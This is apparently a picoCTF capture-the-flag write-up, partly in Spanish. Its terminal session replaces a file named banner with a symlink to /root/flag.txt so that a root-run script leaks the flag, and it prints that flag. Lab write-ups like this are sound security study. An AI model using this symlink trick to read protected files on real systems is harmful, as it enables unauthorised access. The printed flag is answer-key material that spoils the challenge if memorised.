#### - **Descripción** 
#### Description

Kishor Balan tipped us off that the following code may need inspection: `https://jupiter.challenges.picoctf.org/problem/41511/` ([link](https://jupiter.challenges.picoctf.org/problem/41511/)) or http://jupiter.challenges.picoctf.org:41511

#### Pista 
#### - **Solución** 
player@challenge:~$ pwd
pwd
/home/player
player@challenge:~$ whoami
whoami
player
player@challenge:~$ cat banner
cat banner
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Apr  8 18:26 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ^C
richi@RicardoMedina:~$ nc tethys.picoctf.net 65049
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

